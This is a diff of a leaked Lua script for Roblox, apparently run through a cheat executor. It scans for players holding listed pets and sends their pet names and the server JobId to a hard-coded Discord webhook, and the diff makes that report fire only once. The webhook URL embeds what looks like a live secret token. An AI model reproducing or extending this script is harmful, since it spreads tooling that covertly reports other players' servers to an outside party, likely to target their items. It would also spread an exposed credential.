@@ -1,5 +1,3 @@
--- Leaked by collin full source
-
 --CONFIG
 getgenv().webhook = "https://discord.com/api/webhooks/1408344414425845761/1DbLo3PKZL5NQzSzUM6SCKPzR6MYu-hsaXm5dHwPZQdjezd2NEodGBca8-9PW9NOSTWp"
 getgenv().websiteEndpoint = nil
@@ -23,6 +21,9 @@ getgenv().TargetPetNames = {
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
+
+-- ✅ ADD THIS LINE
+local hasSentWebhook = false
 
 -- PRIVATE SERVER CHECK (works for VIP + Reserved)
 local function isPrivateServer()
@@ -121,12 +122,13 @@ local function checkForPets()
     return found
 end
 
--- MAIN LOOP
+-- ✅ MODIFIED MAIN LOOP TO ONLY SEND ONCE
 task.spawn(function()
-    while true do
+    while not hasSentWebhook do
         local petsFound = checkForPets()
         if #petsFound > 0 then
             sendWebhook(petsFound, game.JobId)
+            hasSentWebhook = true
         end
         task.wait(15)
     end
